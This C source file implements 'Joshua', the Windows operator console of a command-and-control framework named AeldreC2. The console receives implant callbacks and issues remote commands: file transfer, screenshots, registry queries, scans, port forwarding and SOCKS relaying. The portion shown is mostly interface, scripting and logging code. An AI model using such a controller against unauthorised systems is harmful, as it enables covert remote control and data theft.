/*
 * joshua.c  --  AeldreC2 Joshua C2 Controller
 *
 * MDI operator console.  Listens for incoming Tank callbacks and operator
 * clients (Lightman / Flynn).
 *
 *  - Session list panel (left 180px, listbox, double-click to activate)
 *  - File receive state machine: FILE:<n>\n + raw bytes + <<<DONE>>>
 *  - put command: GetOpenFileName + remote path, PUTREADY/PUTSIZE handshake
 *  - screenshot command: sends "screenshot\n"; file arrives via FILE: protocol
 *  - Operator clients: Lightman (CLI) and Flynn (GUI) connect with a shared
 *    8-digit hex server key; handles are unique; /givemod /removemod /ops
 *  - Server log / console MDI child: local admin commands always work
 *
 * Build:
 *   wmake -f Makefile.wc joshua
 */

#define WIN32_LEAN_AND_MEAN
#include <winsock.h>
#include <windows.h>
#include <commdlg.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

/* ================================================================
 * Schannel / SSPI types (inline, no security.h required)
 * ================================================================ */
typedef LONG SECURITY_STATUS;
typedef struct { ULONG_PTR dwLower; ULONG_PTR dwUpper; } NC_SecHandle;
typedef NC_SecHandle CredHandle;
typedef NC_SecHandle CtxtHandle;
typedef struct { DWORD LowPart; LONG HighPart; } NC_TimeStamp;
typedef struct { ULONG cbBuffer; ULONG BufferType; PVOID pvBuffer; } SecBuffer;
typedef struct { ULONG ulVersion; ULONG cBuffers; SecBuffer *pBuffers; } SecBufferDesc;
typedef struct {
    ULONG cbHeader; ULONG cbTrailer; ULONG cbMaximumMessage;
    ULONG cBuffers; ULONG cbBlockSize;
} SecPkgContext_StreamSizes;
typedef struct {
    DWORD dwVersion; DWORD cCreds; void **paCred; HANDLE hRootStore;
    DWORD cMappers;  void **aphMappers; DWORD cSupportedAlgs;
    DWORD *palgSupportedAlgs; DWORD grbitEnabledProtocols;
    DWORD dwMinimumCipherStrength; DWORD dwMaximumCipherStrength;
    DWORD dwSessionLifespan; DWORD dwFlags; DWORD dwCredFormat;
} NC_SchannelCred;

#define NC_SECBUF_VERSION           0
#define NC_SECBUFFER_EMPTY          0
#define NC_SECBUFFER_DATA           1
#define NC_SECBUFFER_TOKEN          2
#define NC_SECBUFFER_EXTRA          5
#define NC_SECBUFFER_STREAM_TRAILER 6
#define NC_SECBUFFER_STREAM_HEADER  7
#define NC_SEC_E_OK                 ((SECURITY_STATUS)0x00000000L)
#define NC_SEC_I_CONTINUE_NEEDED    ((SECURITY_STATUS)0x00090312L)
#define NC_SEC_E_INCOMPLETE_MESSAGE ((SECURITY_STATUS)0x80090318L)
#define NC_SECPKG_ATTR_STREAM_SIZES 4
#define NC_SECPKG_CRED_OUTBOUND     2
#define NC_SCHANNEL_CRED_VERSION    4
#define NC_SP_PROT_TLS1_2_CLIENT    0x00000200
#define NC_SP_PROT_TLS1_3_CLIENT    0x00002000
#define NC_SCH_CRED_NO_DEFAULT_CREDS       0x00000010
#define NC_SCH_CRED_MANUAL_CRED_VALIDATION 0x00000008
#define NC_ISC_REQ_REPLAY_DETECT    0x00000004
#define NC_ISC_REQ_SEQUENCE_DETECT  0x00000008
#define NC_ISC_REQ_CONFIDENTIALITY  0x00000010
#define NC_ISC_REQ_ALLOCATE_MEMORY  0x00000100
#define NC_ISC_REQ_STREAM           0x00008000
#define NC_ISC_REQ_MANUAL_CRED_VAL  0x00080000
#define NC_UNISP_NAME "Microsoft Unified Security Protocol Provider"

typedef SECURITY_STATUS (WINAPI *pfAcqCred)(char*,char*,ULONG,void*,void*,void*,void*,CredHandle*,NC_TimeStamp*);
typedef SECURITY_STATUS (WINAPI *pfInitSecCtx)(CredHandle*,CtxtHandle*,char*,ULONG,ULONG,ULONG,SecBufferDesc*,ULONG,CtxtHandle*,SecBufferDesc*,PULONG,NC_TimeStamp*);
typedef SECURITY_STATUS (WINAPI *pfFreeCredH)(CredHandle*);
typedef SECURITY_STATUS (WINAPI *pfDelSecCtx)(CtxtHandle*);
typedef SECURITY_STATUS (WINAPI *pfEncMsg)(CtxtHandle*,ULONG,SecBufferDesc*,ULONG);
typedef SECURITY_STATUS (WINAPI *pfDecMsg)(CtxtHandle*,SecBufferDesc*,ULONG,PULONG);
typedef SECURITY_STATUS (WINAPI *pfFreeCtxBuf)(void*);
typedef SECURITY_STATUS (WINAPI *pfQryCtxAttr)(CtxtHandle*,ULONG,void*);

static HMODULE      g_secur32    = NULL;
static pfAcqCred    p_AcqCred    = NULL;
static pfInitSecCtx p_InitSecCtx = NULL;
static pfFreeCredH  p_FreeCred   = NULL;
static pfDelSecCtx  p_DelSecCtx  = NULL;
static pfEncMsg     p_EncMsg     = NULL;
static pfDecMsg     p_DecMsg     = NULL;
static pfFreeCtxBuf p_FreeCtxBuf = NULL;
static pfQryCtxAttr p_QryCtxAttr = NULL;
static int          g_tls_avail  = 0;

/* ================================================================
 * Control / menu IDs
 * ================================================================ */
#define IDC_OUT         1000
#define IDC_IN          1001
#define IDC_SEND        1002
#define IDC_SESS_LIST   1003

#define IDM_FILE_NEW          2000
#define IDM_FILE_LISTEN       2001
#define IDM_FILE_DISCONNECT   2002
#define IDM_FILE_EXIT         2003

#define IDM_TANK_SYSINFO      2100
#define IDM_TANK_PS           2101
#define IDM_TANK_LS           2102
#define IDM_TANK_GET          2103
#define IDM_TANK_REGQ         2104
#define IDM_TANK_PUT          2105
#define IDM_TANK_SCREENSHOT   2106
#define IDM_TANK_SCAN         2107
#define IDM_TANK_PORTFWD      2108
#define IDM_TANK_SOCKS4       2109
#define IDM_TANK_RELAYSTOP    2110

#define IDM_TANK_PKTVIEW      2115
#define IDM_TANK_SCRIPT_RUN   2111
#define IDM_TANK_MACRO_REC    2112
#define IDM_TANK_MACRO_SAVE   2113
#define IDM_TANK_MACRO_PLAY   2114

#define IDM_WIN_TILE_H        2010
#define IDM_WIN_TILE_V        2011
#define IDM_WIN_CASCADE       2012
#define IDM_WIN_CLOSEALL      2013
#define IDM_HELP_ABOUT        2020

#define IDM_VIEW_THEME_BASE   2200   /* 2200..2220 — one per theme */

#define IDC_DLG_HOST          3000
#define IDC_DLG_PORT          3001
#define IDC_DLG_TLS           3002
#define IDC_DLG_LISTEN        3003
#define IDC_DLG_OK            3004
#define IDC_DLG_CANCEL        3005

#define IDC_INPUT_PROMPT      3100
#define IDC_INPUT_EDIT        3101
#define IDC_INPUT_OK          3102
#define IDC_INPUT_CANCEL      3103

/* Startup config dialog */
#define IDC_SC_PORT           3200
#define IDC_SC_KEY            3201
#define IDC_SC_REGEN          3202
#define IDC_SC_OK             3203

#define WM_NC_SOCKET (WM_APP + 1)
#define WM_NC_DNS    (WM_APP + 2)

#define IDC_PKT_OUT    301
#define IDC_PKT_STATUS 302
#define WC_PKTVIEW     "JoshuaPktView"
#define PKT_IN         0
#define PKT_OUT        1

#ifndef MAXGETHOSTSTRUCT
#define MAXGETHOSTSTRUCT 1024
#endif

#define INPUT_H     26
#define BTN_W       60
#define NC_IBUF     (32 * 1024)
#define ACCUM_SZ    (16 * 1024)
#define SESS_LIST_W 180

/* ================================================================
 * Session states
 * ================================================================ */
#define NS_IDLE             0
#define NS_RESOLVING        1
#define NS_CONNECTING       2
#define NS_TLS_SHAKE        3
#define NS_CONNECTED        4
#define NS_LISTENING        5
#define NS_OP_AWAIT_HANDLE  6  /* operator authed, waiting for HANDLE line */

/* Operator client types */
#define IS_OP_LIGHTMAN 1
#define IS_OP_FLYNN    2

/* File receive modes */
#define RECV_TEXT 0
#define RECV_FILE 1

/* ================================================================
 * Theme table  (ported from fyrtaarn/internal/tui/colourmylife.go)
 * Fields: bg=notification bg, strip=accent bar, title=title text, body=body text
 * ================================================================ */
typedef struct {
    const char *name;   /* persisted to WIN.INI */
    const char *label;  /* menu display text     */
    COLORREF    bg;
    COLORREF    strip;
    COLORREF    title;
    COLORREF    body;
} JoshTheme;

static const JoshTheme g_themes[] = {
    { "solarized",         "Solarized Dark",        RGB(  0, 43, 54), RGB(133,153,  0), RGB(133,153,  0), RGB(131,148,150) },
    { "british",           "British Rail",           RGB(  0, 48,135), RGB(198, 12, 48), RGB(255,255,255), RGB(255,255,255) },
    { "class91",           "InterCity Class 91",     RGB(255,255,255), RGB(  0,  0,  0), RGB(255,255,255), RGB(204,  0,  0) },
    { "dark",              "Dark",                   RGB(  0,102,  0), RGB(  0,  0,  0), RGB(170,170,170), RGB(170,170,170) },
    { "db-1980s",          "Deutsche Bundesbahn",    RGB(102,102,102), RGB(136,136,136), RGB(  0,  0,  0), RGB(  0,  0,  0) },
    { "dsb",               "DSB",                    RGB(136,  0,  0), RGB(204,  0,  0), RGB(255,255,255), RGB(255,255,255) },
    { "gemstones",         "Gemstones",              RGB( 68,187, 68), RGB(255,255,255), RGB(  0,102,  0), RGB(255,255,255) },
    { "intercity-swallow", "InterCity Swallow",      RGB( 85, 85, 85), RGB( 51, 51, 51), RGB(255,255,255), RGB(255,255,255) },
    { "irn-bru",           "IRN-BRU",                RGB(255,102,  0), RGB(255,102,  0), RGB(255,255,255), RGB(255,255,255) },
    { "light",             "Light",                  RGB(  0,170,170), RGB(  0,119,119), RGB(  0,  0,  0), RGB(  0,  0,  0) },
    { "matrix",            "Matrix",                 RGB(  0,  0,  0), RGB(  0,  0,  0), RGB(  0,204,  0), RGB(204,204,  0) },
    { "network-southeast", "Network SouthEast",      RGB(255,255,255), RGB(224,224,224), RGB(  0,  0,  0), RGB(  0,  0,  0) },
    { "ns",                "NS (Dutch Railways)",    RGB(255,255, 68), RGB(204,204,  0), RGB(  0,  0,  0), RGB(  0,  0,  0) },
    { "pan-am",            "Pan Am",                 RGB( 68,102,204), RGB(255,255,255), RGB(  0, 68,204), RGB(255,255,255) },
    { "procomm",           "ProComm",                RGB(  0,  0,  0), RGB(170,  0,  0), RGB(255,255,  0), RGB(255,255,255) },
    { "renaissance",       "Renaissance",            RGB( 30, 30, 30), RGB( 48, 48, 48), RGB(208,208,208), RGB(208,208,208) },
    { "scotrail",          "ScotRail",               RGB( 85,119,204), RGB(  0, 51,170), RGB(255,255, 85), RGB(  0,  0,  0) },
    { "teletext",          "Teletext",               RGB(  0,  0,170), RGB(  0,  0,  0), RGB(255,255,  0), RGB(255,255,255) },
    { "twa",               "TWA",                    RGB(136,  0,  0), RGB(204,  0,  0), RGB(255,255,255), RGB(255,255,255) },
    { "viarail",           "VIA Rail",               RGB(255,255, 68), RGB(204,204,  0), RGB(  0,  0,  0), RGB(  0,  0,  0) },
    { "viarail-soft",      "VIA Rail Soft",          RGB(  0, 51,170), RGB(  0, 26,110), RGB(255,255,255), RGB(255,255,255) },
};
#define THEME_COUNT ((int)(sizeof(g_themes)/sizeof(g_themes[0])))

/* ================================================================
 * Session struct
 * ================================================================ */
typedef struct {
    /* Network */
    HWND   hwnd;
    SOCKET sock;
    SOCKET listen_sock;
    int    state;
    int    tls;
    char   host[256];
    int    port;
    /* Schannel */
    CredHandle tls_cred;
    CtxtHandle tls_ctx;
    int        tls_cred_valid;
    int        tls_ctx_valid;
    char       tls_ibuf[NC_IBUF];
    int        tls_ibuf_len;
    SecPkgContext_StreamSizes tls_sizes;
    int        tls_sizes_valid;
    /* DNS */
    HANDLE dns_task;
    char   dns_buf[MAXGETHOSTSTRUCT];
    /* Tank identity */
    int    is_tank;
    char   tank_host[MAX_PATH];
    char   tank_os[64];
    char   tank_shell[MAX_PATH];
    int    cmd_busy;
    /* File receive state machine */
    int    recv_mode;
    DWORD  file_recv_size;
    DWORD  file_recv_got;
    HANDLE file_recv_hfile;
    char   file_recv_path[MAX_PATH];
    /* Put pending */
    int    put_pending;
    char   put_local_path[MAX_PATH];
    /* Line accumulator */
    char   accum[ACCUM_SZ];
    int    accum_len;
    /* Operator client (Lightman / Flynn) */
    int    is_op;          /* IS_OP_LIGHTMAN=1 or IS_OP_FLYNN=2, 0=tank */
    char   op_handle[64];  /* nom-de-plume */
    int    op_is_mod;      /* moderator status */
    int    op_authed;      /* passed key check */
    /* Local server console (never has a real socket) */
    int    is_console;
    /* Pager state (less command) */
    int    pager_active;   /* 1 = waiting for NEXTPAGE/QUITPAGE */
    /* Progress bar for file receive */
    int    file_recv_last_pct;   /* last percentage painted; -1 = bar not started */
    /* Scan TSV capture — active while a scan command is in flight    */
    int    scan_active;
    HANDLE scan_tsv;             /* temp file receiving TSV lines     */
    char   scan_tsv_path[MAX_PATH];
    /* Packet viewer                                                    */
    HWND  pkt_hwnd;
    DWORD pkt_in_bytes;
    DWORD pkt_out_bytes;
    /* Script execution — queued commands sent one per <<<DONE>>>     */
    char **script_cmds;
    int    script_count;
    int    script_idx;
    /* Macro recording                                                 */
    int    macro_rec;            /* 1 = recording in progress         */
    char **macro_cmds;           /* recorded command strings          */
    int    macro_count;
    int    macro_cap;
} JoshSession;

#define MAX_SESSIONS 16
static JoshSession *g_sess[MAX_SESSIONS];
static int          g_nsess   = 0;
static HWND         g_frame   = NULL;
static HWND         g_mdi     = NULL;
static HWND         g_sess_list = NULL;
static HINSTANCE    g_hinst   = NULL;
static WNDPROC      g_in_orig = NULL;

/* Theme state */
static int   g_theme_idx  = 0;     /* index into g_themes[] */
static HMENU g_theme_menu = NULL;  /* theme submenu — for checkmark updates */

/* Dialog state */
static HWND g_dlg             = NULL;
static HWND g_dlg_hedit       = NULL;
static HWND g_dlg_pedit       = NULL;
static HWND g_dlg_tlschk      = NULL;
static HWND g_dlg_listenchk   = NULL;
static char g_dlg_host_buf[256];
static char g_dlg_port_buf[16];
static int  g_dlg_tls_val     = 0;
static int  g_dlg_listen_val  = 1;
static int  g_dlg_ok          = 0;

/* Input-box dialog state */
static HWND g_inp_dlg  = NULL;
static HWND g_inp_edit = NULL;
static char g_inp_buf[MAX_PATH];
static int  g_inp_ok   = 0;

/* Operator / server key state */
static char         g_server_key[9];           /* 8 hex digits, set at startup */
static JoshSession *g_console_sess = NULL;     /* local server log + console */

/* Startup config dialog result */
static int  g_startup_port = 4444;

/* Logging */
static FILE *g_logfile = NULL;

/* mmsystem.h constants — not included since winmm.dll is loaded dynamically */
#ifndef SND_ASYNC
#  define SND_SYNC       0x0000
#  define SND_ASYNC      0x0001
#  define SND_NODEFAULT  0x0002
#  define SND_RESOURCE   0x0004
#  define SND_ALIAS      0x0010
#  define SND_PURGE      0x0040
#endif

/* Forward declarations */
static void show_notification(const char *title, const char *body);
static void session_append(JoshSession *s, const char *text);
static void session_send_cmd(JoshSession *s, const char *cmd);

static HFONT make_font(const char *face, int pts, int bold, int italic)
{
    HDC dc = GetDC(NULL);
    int lh = -MulDiv(pts, GetDeviceCaps(dc, LOGPIXELSY), 72);
    ReleaseDC(NULL, dc);
    return CreateFont(lh, 0, 0, 0,
                      bold ? FW_BOLD : FW_NORMAL,
                      italic, FALSE, FALSE,
                      ANSI_CHARSET, OUT_DEFAULT_PRECIS,
                      CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY,
                      DEFAULT_PITCH | FF_DONTCARE, face);
}

static void theme_set(int idx)
{
    int i;
    if (idx < 0 || idx >= THEME_COUNT) return;
    g_theme_idx = idx;
    if (g_theme_menu) {
        for (i = 0; i < THEME_COUNT; i++)
            CheckMenuItem(g_theme_menu, (UINT)i,
                          MF_BYPOSITION | (i == idx ? MF_CHECKED : MF_UNCHECKED));
    }
    WriteProfileString("AeldreC2", "Theme", g_themes[idx].name);
}

static void theme_load(void)
{
    char buf[64];
    int  i;
    GetProfileString("AeldreC2", "Theme", "solarized", buf, sizeof(buf));
    for (i = 0; i < THEME_COUNT; i++) {
        if (lstrcmpi(buf, g_themes[i].name) == 0) {
            g_theme_idx = i;
            return;
        }
    }
    g_theme_idx = 0;  /* fallback to solarized */
}

/* ------------------------------------------------------------------ */
/* Sound events — fired outwith any painting or socket paths          */
/*                                                                    */
/* winmm.dll is loaded dynamically so Joshua links outwith it;       */
/* on machines that lack a sound card the call fails silently outwith */
/* affecting anything else.  MessageBeep is the fallback.            */
/* ------------------------------------------------------------------ */
#define SOUND_TANK_CONNECT    "SystemAsterisk"
#define SOUND_TANK_DISCONNECT "SystemExclamation"
#define SOUND_OP_JOIN         "SystemAsterisk"
#define SOUND_OP_LEAVE        "SystemDefault"

/* ------------------------------------------------------------------ */
/* Easter egg — £ keypress during the startup splash                  */
/*                                                                    */
/* Plays the Windows NT 4.0 startup theme embedded as WAVE resource  */
/* IDR_NT4_STARTUP (9001).  To activate: place nt4startup.wav in     */
/* windows/ before building.  Works on any Windows version; it does  */
/* not need to be NT 4.0.                                            */
/* ------------------------------------------------------------------ */
#define IDR_NT4_STARTUP 9001

static void play_easter_egg(void)
{
    typedef BOOL (WINAPI *pfPlay)(LPCSTR, HMODULE, DWORD);
    static pfPlay p_play  = NULL;
    static int    checked = 0;
    if (!checked) {
        HMODULE h = LoadLibrary("winmm.dll");
        if (h) p_play = (pfPlay)GetProcAddress(h, "PlaySoundA");
        checked = 1;
    }
    if (!p_play) return;
    p_play(NULL, NULL, SND_PURGE);   /* stop anything already playing */
    p_play(MAKEINTRESOURCE(IDR_NT4_STARTUP), g_hinst,
           SND_RESOURCE | SND_ASYNC | SND_NODEFAULT);
}

static void sound_event(const char *alias)
{
    typedef BOOL (WINAPI *pfPlay)(LPCSTR, HMODULE, DWORD);
    static pfPlay p_play  = NULL;
    static int    checked = 0;
    if (!checked) {
        HMODULE h = LoadLibrary("winmm.dll");
        /* Keep the handle — outwith FreeLibrary so it stays loaded   */
        if (h) p_play = (pfPlay)GetProcAddress(h, "PlaySoundA");
        checked = 1;
    }
    if (p_play)
        p_play(alias, NULL, SND_ALIAS | SND_ASYNC | SND_NODEFAULT);
    else
        MessageBeep(MB_ICONASTERISK);   /* fallback outwith winmm     */
}

static void spawn_dumont(const char *tsv_path)
{
    char             dumont[MAX_PATH], cmd[MAX_PATH * 2 + 16];
    STARTUPINFO      si;
    PROCESS_INFORMATION pi;
    DWORD            n;

    n = GetModuleFileName(NULL, dumont, MAX_PATH);
    if (n == 0 || n >= MAX_PATH) return;
    { char *sl = strrchr(dumont, '\\'); if (sl) *(sl + 1) = '\0'; else dumont[0] = '\0'; }
    lstrcat(dumont, "dumont.exe");

    sprintf(cmd, "\"%s\" \"%s\"", dumont, tsv_path);
    memset(&si, 0, sizeof(si)); si.cb = sizeof(si);
    memset(&pi, 0, sizeof(pi));
    if (CreateProcess(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
}

/* ------------------------------------------------------------------ */
/* Packet viewer                                                       */
/* ------------------------------------------------------------------ */

static void pkt_status_update(JoshSession *s)
{
    char buf[80];
    HWND sw;
    if (!s->pkt_hwnd) return;
    sw = GetDlgItem(s->pkt_hwnd, IDC_PKT_STATUS);
    if (!sw) return;
    sprintf(buf, "  IN: %lu bytes    OUT: %lu bytes",
            (unsigned long)s->pkt_in_bytes,
            (unsigned long)s->pkt_out_bytes);
    SetWindowText(sw, buf);
}

static void pkt_append(JoshSession *s, int dir, const char *data, int len)
{
    HWND   edit;
    char   hdr[80], row[80];
    char   hex[52], asc[17];
    int    i, j;
    DWORD  tick;

    if (!s || !s->pkt_hwnd || len <= 0) return;
    if (dir == PKT_IN) s->pkt_in_bytes  += (DWORD)len;
    else               s->pkt_out_bytes += (DWORD)len;

    edit = GetDlgItem(s->pkt_hwnd, IDC_PKT_OUT);
    if (!edit) return;

    tick = GetTickCount();
    sprintf(hdr, "\r\n[%02lu:%02lu:%02lu.%03lu] %s  %d byte%s\r\n",
            (unsigned long)((tick/3600000)%24),
            (unsigned long)((tick/60000)%60),
            (unsigned long)((tick/1000)%60),
            (unsigned long)(tick%1000),
            dir == PKT_IN ? "<< IN " : ">> OUT",
            len, len == 1 ? "" : "s");

    { int el = GetWindowTextLength(edit);
      SendMessage(edit, EM_SETSEL, (WPARAM)el, (LPARAM)el);
      SendMessage(edit, EM_REPLACESEL, 0, (LPARAM)hdr); }

    for (i = 0; i < len; i += 16) {
        int row_len = len - i; if (row_len > 16) row_len = 16;
        int hpos = 0;
        memset(asc, 0, sizeof(asc));
        for (j = 0; j < 16; j++) {
            if (j < row_len) {
                unsigned char c = (unsigned char)data[i + j];
                sprintf(hex + hpos, "%02x ", c);
                asc[j] = (c >= 0x20 && c <= 0x7e) ? (char)c : '.';
            } else {
                strcpy(hex + hpos, "   ");
                asc[j] = ' ';
            }
            hpos += 3;
            if (j == 7) hex[hpos++] = ' ';
        }
        hex[hpos] = '\0'; asc[16] = '\0';
        sprintf(row, "%04x  %s %s\r\n", i, hex, asc);
        { int el = GetWindowTextLength(edit);
          SendMessage(edit, EM_SETSEL, (WPARAM)el, (LPARAM)el);
          SendMessage(edit, EM_REPLACESEL, 0, (LPARAM)row); }
    }

    pkt_status_update(s);
}

static LRESULT CALLBACK PktViewProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
{
    JoshSession *s = (JoshSession *)GetWindowLong(hwnd, GWL_USERDATA);

    switch (msg) {
    case WM_CREATE: {
        CREATESTRUCT    *cs = (CREATESTRUCT *)lp;
        MDICREATESTRUCT *mc = (MDICREATESTRUCT *)cs->lpCreateParams;
        RECT rc;
        s = (JoshSession *)mc->lParam;
        SetWindowLong(hwnd, GWL_USERDATA, (LONG)s);
        GetClientRect(hwnd, &rc);
        CreateWindow("EDIT", "",
            WS_CHILD|WS_VISIBLE|WS_VSCROLL|WS_HSCROLL|
            ES_MULTILINE|ES_READONLY|ES_AUTOVSCROLL,
            0, 0, rc.right, rc.bottom - 20,
            hwnd, (HMENU)IDC_PKT_OUT, g_hinst, NULL);
        { HWND sw = CreateWindow("STATIC", "  IN: 0 bytes    OUT: 0 bytes",
            WS_CHILD|WS_VISIBLE|SS_LEFT,
            0, rc.bottom - 20, rc.right, 20,
            hwnd, (HMENU)IDC_PKT_STATUS, g_hinst, NULL);
          SendMessage(sw, WM_SETFONT,
                      (WPARAM)GetStockObject(DEFAULT_GUI_FONT), FALSE); }
        SendMessage(GetDlgItem(hwnd, IDC_PKT_OUT), WM_SETFONT,
                    (WPARAM)GetStockObject(SYSTEM_FIXED_FONT), FALSE);
        return 0;
    }
    case WM_SIZE: {
        int w = (int)LOWORD(lp), h = (int)HIWORD(lp);
        MoveWindow(GetDlgItem(hwnd, IDC_PKT_OUT),    0, 0,  w, h - 20, TRUE);
        MoveWindow(GetDlgItem(hwnd, IDC_PKT_STATUS), 0, h - 20, w, 20, TRUE);
        return 0;
    }
    case WM_KEYDOWN:
        /* Ctrl+L clears the log */
        if (wp == 'L' && (GetKeyState(VK_CONTROL) & 0x8000)) {
            SetWindowText(GetDlgItem(hwnd, IDC_PKT_OUT), "");
            if (s) { s->pkt_in_bytes = 0; s->pkt_out_bytes = 0; pkt_status_update(s); }
            return 0;
        }
        break;
    case WM_CLOSE:
    case WM_DESTROY:
        if (s) s->pkt_hwnd = NULL;
        break;
    }
    return DefMDIChildProc(hwnd, msg, wp, lp);
}

/* ------------------------------------------------------------------ */
/* Script engine                                                       */
/* ------------------------------------------------------------------ */

static void script_free(JoshSession *s)
{
    int i;
    if (!s->script_cmds) return;
    for (i = 0; i < s->script_count; i++) free(s->script_cmds[i]);
    free(s->script_cmds);
    s->script_cmds  = NULL;
    s->script_count = 0;
    s->script_idx   = 0;
}

static int script_load(JoshSession *s, const char *path)
{
    FILE  *f;
    char   line[2048];
    char **cmds = NULL;
    int    count = 0, cap = 0;

    script_free(s);
    f = fopen(path, "r");
    if (!f) return 0;

    while (fgets(line, sizeof(line), f)) {
        int   len;
        char *p = line, **t;
        /* Skip comments and blank lines                               */
        while (*p == ' ' || *p == '\t') p++;
        if (*p == '#' || *p == '\r' || *p == '\n' || *p == '\0') continue;
        len = (int)strlen(p);
        while (len > 0 && (p[len-1] == '\r' || p[len-1] == '\n' ||
                            p[len-1] == ' '  || p[len-1] == '\t'))
            p[--len] = '\0';
        if (len == 0) continue;

        if (count >= cap) {
            int nc = cap ? cap * 2 : 16;
            t = (char **)realloc(cmds, (size_t)nc * sizeof(char *));
            if (!t) break;
            cmds = t; cap = nc;
        }
        cmds[count] = (char *)malloc((size_t)len + 1);
        if (!cmds[count]) break;
        memcpy(cmds[count], p, (size_t)len + 1);
        count++;
    }
    fclose(f);

    if (count == 0) { free(cmds); return 0; }
    s->script_cmds  = cmds;
    s->script_count = count;
    s->script_idx   = 0;
    return count;
}

/* Advance to next script command — called from the <<<DONE>>> handler */
static void script_advance(JoshSession *s)
{
    if (!s->script_cmds) return;

    if (s->script_idx < s->script_count) {
        /* Send the next command; suppress the separator for mid-run  */
        session_send_cmd(s, s->script_cmds[s->script_idx++]);
    } else {
        /* All done                                                    */
        char msg[64];
        sprintf(msg, "[Script complete — %d commands]\r\n", s->script_count);
        session_append(s, msg);
        session_append(s, "\xc4\xc4\xc4\xc4\xc4\xc4\xc4\xc4\xc4\xc4\r\n");
        script_free(s);
    }
}

/* ------------------------------------------------------------------ */
/* Macro recording                                                     */
/* ------------------------------------------------------------------ */

static void macro_free(JoshSession *s)
{
    int i;
    if (!s->macro_cmds) return;
    for (i = 0; i < s->macro_count; i++) free(s->macro_cmds[i]);
    free(s->macro_cmds);
    s->macro_cmds  = NULL;
    s->macro_count = 0;
    s->macro_cap   = 0;
}

static void macro_record_cmd(JoshSession *s, const char *cmd)
{
    char **t;
    int    len;
    if (!s->macro_rec) return;
    if (s->macro_count >= s->macro_cap) {
        int nc = s->macro_cap ? s->macro_cap * 2 : 16;
        t = (char **)realloc(s->macro_cmds, (size_t)nc * sizeof(char *));
        if (!t) return;
        s->macro_cmds = t; s->macro_cap = nc;
    }
    len = lstrlen(cmd);
    s->macro_cmds[s->macro_count] = (char *)malloc((size_t)len + 1);
    if (!s->macro_cmds[s->macro_count]) return;
    memcpy(s->macro_cmds[s->macro_count], cmd, (size_t)len + 1);
    s->macro_count++;
}

static int macro_save(JoshSession *s, const char *path)
{
    FILE *f; int i;
    if (!s->macro_cmds || s->macro_count == 0) return 0;
    f = fopen(path, "w");
    if (!f) return 0;
    fprintf(f, "# AeldreC2 macro  —  %d commands\n", s->macro_count);
    for (i = 0; i < s->macro_count; i++)
        fprintf(f, "%s\n", s->macro_cmds[i]);
    fclose(f);
    return 1;
}

static void macro_play(JoshSession *s)
{
    /* Convert macro_cmds into the script engine then fire              */
    int    i;
    char **cmds;

    if (!s->macro_cmds || s->macro_count == 0) return;
    script_free(s);
    cmds = (char **)malloc((size_t)s->macro_count * sizeof(char *));
    if (!cmds) return;
    for (i = 0; i < s->macro_count; i++) {
        int len = lstrlen(s->macro_cmds[i]);
        cmds[i] = (char *)malloc((size_t)len + 1);
        if (cmds[i]) memcpy(cmds[i], s->macro_cmds[i], (size_t)len + 1);
    }
    s->script_cmds  = cmds;
    s->script_count = s->macro_count;
    s->script_idx   = 0;
    /* Fire the first command immediately                               */
    if (s->state == NS_CONNECTED && !s->cmd_busy)
        session_send_cmd(s, s->script_cmds[s->script_idx++]);
}

/* Save-dialog helper for macros                                       */
static int macro_browse_save(char *out, int outsz)
{
    OPENFILENAME ofn;
    memset(&ofn, 0, sizeof(ofn));
    out[0] = '\0';
    ofn.lStructSize = sizeof(ofn);
    ofn.hwndOwner   = g_frame;
    ofn.lpstrFilter = "Macro files (*.mac)\0*.mac\0Script files (*.txt)\0*.txt\0All files\0*.*\0\0";
    ofn.lpstrFile   = out;
    ofn.nMaxFile    = (DWORD)outsz;
    ofn.lpstrTitle  = "Save Macro";
    ofn.Flags       = OFN_OVERWRITEPROMPT;
    return GetSaveFileName(&ofn);
}

static void log_open(void)
{
    char path[MAX_PATH];
    DWORD n = GetModuleFileName(NULL, path, MAX_PATH);
    if (n > 0 && n < MAX_PATH) {
        char *sl = strrchr(path, '\\');
        if (sl) strcpy(sl + 1, "joshua.log");
        else    strcpy(path, "joshua.log");
    } else {
        strcpy(path, "joshua.log");
    }
    g_logfile = fopen(path, "a");
    if (g_logfile) {
        SYSTEMTIME st;
        GetLocalTime(&st);
        fprintf(g_logfile,
                "\r\n===== Joshua started %04d-%02d-%02d %02d:%02d:%02d =====\r\n",
                st.wYear, st.wMonth, st.wDay,
                st.wHour, st.wMinute, st.wSecond);
        fflush(g_logfile);
    }
}

static void log_write(const char *text)
{
    SYSTEMTIME st;
    char       ts[32];
    if (!g_logfile || !text || !text[0]) return;
    GetLocalTime(&st);
    sprintf(ts, "[%02d:%02d:%02d] ", st.wHour, st.wMinute, st.wSecond);
    fputs(ts,   g_logfile);
    fputs(text, g_logfile);
    /* ensure CRLF at end */
    { int l = (int)strlen(text);
      if (l == 0 || text[l-1] != '\n') fputs("\r\n", g_logfile); }
    fflush(g_logfile);
}

/* ================================================================
 * Forward declarations
 * ================================================================ */
static void session_append(JoshSession *s, const char *text);
static void session_process_data(JoshSession *s, const char *buf, int len);
static void session_close(JoshSession *s);
static void session_set_title(JoshSession *s);
static void update_session_list(void);
static void joshua_send_put_data(JoshSession *s);
static void new_session(const char *host, int port, int tls_flag, int listen_mode);
static int  tls_client_begin(JoshSession *s);
static void tls_handshake_feed(JoshSession *s);
static void tls_decrypt_recv(JoshSession *s, const char *buf, int len);
static int  tls_encrypt_send(JoshSession *s, const char *data, int dlen);
static void gen_server_key(void);
static void log_append(const char *text);
static void op_send(JoshSession *s, const char *line);
static void operator_broadcast(const char *text);
static int  handle_is_unique(const char *handle);
static int  count_mods(void);
static void operator_process_cmd(JoshSession *s, const char *line);
static void local_console_cmd(const char *line);
static LRESULT CALLBACK FrameProc(HWND, UINT, WPARAM, LPARAM);
static LRESULT CALLBACK ChildProc(HWND, UINT, WPARAM, LPARAM);
static LRESULT CALLBACK DlgProc(HWND, UINT, WPARAM, LPARAM);
static LRESULT CALLBACK InputSubclass(HWND, UINT, WPARAM, LPARAM);
static LRESULT CALLBACK InputBoxProc(HWND, UINT, WPARAM, LPARAM);

/* ================================================================
 * Schannel init
 * ================================================================ */
